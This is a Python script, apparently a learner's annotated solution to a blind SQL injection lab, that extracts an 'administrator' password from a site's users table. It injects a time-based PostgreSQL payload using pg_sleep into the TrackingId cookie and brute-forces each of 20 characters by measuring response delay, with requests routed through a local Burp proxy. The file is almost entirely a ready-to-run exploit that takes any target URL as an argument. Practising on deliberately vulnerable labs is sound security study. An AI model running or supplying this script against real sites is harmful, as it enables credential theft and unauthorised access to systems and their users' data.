# step 1 ('w' script)
import sys
import requests
import urllib3
import urllib

# step 2 ('w' script)
# ignores url certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# step 3 ('w' script)
# sends traffic to burp first ( debugging / observation )
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# step 7 ('w' script)
# defines steps 6 -> sqli_password(url) function
def sqli_password(url):
	password_extracted = "" # <-- password characters exctracted get stored here
	for i in range(1,21):
		for j in range(32,126):
			sql_payload = "' ||(select case when (username='administrator' and ascii(substring(password,%s,1)) = '%s') then pg_sleep(10) else pg_sleep(-1) end from users)-- |" % (i,j)   # <- payload we get after finding informaiton ( tablename,columnname, length(password), etc.)
			sql_payload_encoded = urllib.parse.quote(sql_payload)
			cookies = {'TrackingId': 'sKcFlDC59Hn0nUB3' + sql_payload_encoded, 'session': 'S3Kg57JiU2W6qBpzhBa2KQIE1fYPmS8p'}
			r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
			if int(r.elapsed.total_seconds()) > 9:
				password_extracted += chr(j)
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break
			else:
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()


# step 5 ('w' script)
# now we are defining the code in step #4 -> which is the name method
def main():
	if len(sys.argv) != 2:   # checks to make sure that 2 values are being inputed for main to run: (script.py, url) <-- checks to make sure script name is there & url in 2nd param, if it's not then the below runs )
		print("(+) Usage: %s <url>" % sys.argv[0])
		print("(+) Example: %s www.example.com" % sys.argv[0])
		sys.exit(-1) # <-- exsists the program

# step 6 ('w' script)
# exploits blind base sqli injection / retrieves username[]= password
	url = sys.argv[1]
	print("(+) Retreiving password, go get a beer or something while you wait . . .") # custom retrieve password message
	sqli_password(url)





# step 4 ('w' script)
# name method ( checks if the script is being run directly. If script is run directly than main() is called )
if __name__ == "__main__":
	main()